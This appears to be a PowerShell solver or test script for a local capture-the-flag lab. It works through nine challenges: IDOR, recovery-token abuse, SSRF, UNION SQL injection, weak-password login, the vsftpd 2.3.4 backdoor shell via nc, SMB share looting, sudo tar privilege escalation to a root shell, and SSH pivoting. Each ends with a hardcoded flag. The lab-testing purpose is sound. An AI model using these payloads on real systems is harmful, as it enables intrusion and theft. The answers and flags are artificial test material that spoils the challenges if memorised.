$ErrorActionPreference = 'Stop'
$base = 'http://localhost:3000'
$results = [ordered]@{}

function Test-Challenge([string]$name, [scriptblock]$body) {
  try { $results[$name] = & $body } catch { $results[$name] = "FAIL: $($_.Exception.Message)" }
}

# Challenge 1: HR IDOR
Test-Challenge 'hr' {
  $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
  Invoke-RestMethod -Uri "$base/api/hr/reset" -Method Post -WebSession $s | Out-Null
  Invoke-RestMethod -Uri "$base/api/hr/api/login" -Method Post -ContentType 'application/json' -Body (@{email='analyst@northstar.internal';password='northstar-analyst'} | ConvertTo-Json) -WebSession $s | Out-Null
  Invoke-RestMethod -Uri "$base/api/hr/api/employees?id=1002" -WebSession $s | Out-Null
  (Invoke-RestMethod -Uri "$base/api/hr/submit" -Method Post -ContentType 'application/json' -Body (@{flag='RIVAN{idor_broken_access_control}'} | ConvertTo-Json) -WebSession $s).accepted
}

# Challenge 2: portal session security (predictable recovery token)
Test-Challenge 'portal' {
  $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
  Invoke-RestMethod -Uri "$base/api/portal/reset" -Method Post -WebSession $s | Out-Null
  Invoke-RestMethod -Uri "$base/api/portal/api/auth/recovery" -Method Post -ContentType 'application/json' -Body (@{email='operations-admin@northstar.internal'} | ConvertTo-Json) -WebSession $s | Out-Null
  Invoke-RestMethod -Uri "$base/api/portal/api/auth/reset" -Method Post -ContentType 'application/json' -Body (@{email='operations-admin@northstar.internal'; token='northstar-2048'; newPassword='pwned123'} | ConvertTo-Json) -WebSession $s | Out-Null
  Invoke-RestMethod -Uri "$base/api/portal/api/auth/login" -Method Post -ContentType 'application/json' -Body (@{email='operations-admin@northstar.internal'; password='pwned123'} | ConvertTo-Json) -WebSession $s | Out-Null
  (Invoke-RestMethod -Uri "$base/api/portal/submit" -Method Post -ContentType 'application/json' -Body (@{flag='RIVAN{session_security_failure}'} | ConvertTo-Json) -WebSession $s).accepted
}

# Challenge 3: scanner SSRF
Test-Challenge 'scanner' {
  $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
  Invoke-RestMethod -Uri "$base/api/scanner/reset" -Method Post -WebSession $s | Out-Null
  Invoke-RestMethod -Uri "$base/api/scanner/api/scan" -Method Post -ContentType 'application/json' -Body (@{url='http://internal-admin.internal.lab/api/flag'} | ConvertTo-Json) -WebSession $s | Out-Null
  (Invoke-RestMethod -Uri "$base/api/scanner/submit" -Method Post -ContentType 'application/json' -Body (@{flag='RIVAN{ssrf_internal_network}'} | ConvertTo-Json) -WebSession $s).accepted
}

# Helper: send a command to a terminal-based lab machine
function Send-Terminal([string]$ns, $session, [string]$command) {
  Invoke-RestMethod -Uri "$base/api/$ns/terminal" -Method Post -ContentType 'application/json' -Body (@{command=$command} | ConvertTo-Json) -WebSession $session | Out-Null
}

function Submit-Flag([string]$ns, $session, [string]$flag) {
  (Invoke-RestMethod -Uri "$base/api/$ns/submit" -Method Post -ContentType 'application/json' -Body (@{flag=$flag} | ConvertTo-Json) -WebSession $session).accepted
}

# Challenge 4: aurora SQL injection (union extraction from secrets table)
Test-Challenge 'aurora' {
  $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
  Invoke-RestMethod -Uri "$base/api/aurora/reset" -Method Post -WebSession $s | Out-Null
  $q = [uri]::EscapeDataString("' UNION SELECT id,item,value,1,2 FROM secrets-- -")
  Invoke-RestMethod -Uri "$base/api/aurora/api/search?q=$q" -WebSession $s | Out-Null
  Submit-Flag 'aurora' $s 'RIVAN{sqli_union_extraction}'
}

# Challenge 5: harborpoint credential attack (known weak password from wordlist)
Test-Challenge 'harborpoint' {
  $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
  Invoke-RestMethod -Uri "$base/api/harborpoint/reset" -Method Post -WebSession $s | Out-Null
  Invoke-RestMethod -Uri "$base/api/harborpoint/api/login" -Method Post -ContentType 'application/json' -Body (@{username='mrivera';password='Summer2024!'} | ConvertTo-Json) -WebSession $s | Out-Null
  Invoke-RestMethod -Uri "$base/api/harborpoint/api/secure-vault" -WebSession $s | Out-Null
  Submit-Flag 'harborpoint' $s 'RIVAN{credential_attack_hydra}'
}

# Challenge 6: nse vsftpd 2.3.4 backdoor (smiley username triggers port 6200 shell)
Test-Challenge 'nse' {
  $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
  Invoke-RestMethod -Uri "$base/api/nse/reset" -Method Post -WebSession $s | Out-Null
  Send-Terminal 'nse' $s 'nmap -sV 10.20.30.10'
  Send-Terminal 'nse' $s 'ftp 10.20.30.10'
  Send-Terminal 'nse' $s 'attacker:)'
  Send-Terminal 'nse' $s 'whatever'
  Send-Terminal 'nse' $s 'nc 10.20.30.10 6200'
  Send-Terminal 'nse' $s 'cat /root/flag.txt'
  Submit-Flag 'nse' $s 'RIVAN{vsftpd_backdoor_6200}'
}

# Challenge 7: smb guest share loot -> creds -> restricted Dept-IT share
Test-Challenge 'smb' {
  $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
  Invoke-RestMethod -Uri "$base/api/smb/reset" -Method Post -WebSession $s | Out-Null
  Send-Terminal 'smb' $s 'smbclient //10.20.50.20/Backups -N'
  Send-Terminal 'smb' $s 'get svc-accounts.txt'
  Send-Terminal 'smb' $s 'exit'
  Send-Terminal 'smb' $s 'smbclient //10.20.50.20/Dept-IT -U bsmith%BSM-2024-Backup!'
  Send-Terminal 'smb' $s 'get flag.txt'
  Submit-Flag 'smb' $s 'RIVAN{smb_guest_share_loot}'
}

# Challenge 8: privesc via sudo tar GTFOBins checkpoint-action
Test-Challenge 'privesc' {
  $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
  Invoke-RestMethod -Uri "$base/api/privesc/reset" -Method Post -WebSession $s | Out-Null
  Send-Terminal 'privesc' $s 'sudo -l'
  Send-Terminal 'privesc' $s 'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'
  Send-Terminal 'privesc' $s 'cat /root/flag.txt'
  Submit-Flag 'privesc' $s 'RIVAN{privesc_sudo_tar_root}'
}

# Challenge 9: pivot through DMZ foothold to internal finance host
Test-Challenge 'pivot' {
  $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
  Invoke-RestMethod -Uri "$base/api/pivot/reset" -Method Post -WebSession $s | Out-Null
  Send-Terminal 'pivot' $s 'ssh webapp@10.20.10.15'
  Send-Terminal 'pivot' $s 'W3b-App!2024'
  Send-Terminal 'pivot' $s 'cat notes.txt'
  Send-Terminal 'pivot' $s 'ssh jdoe@172.16.30.40'
  Send-Terminal 'pivot' $s 'Jd0e-W1nt3r!'
  Send-Terminal 'pivot' $s 'cat flag.txt'
  Submit-Flag 'pivot' $s 'RIVAN{lateral_movement_pivot}'
}

foreach ($k in $results.Keys) { "{0,-12} {1}" -f $k, $results[$k] }
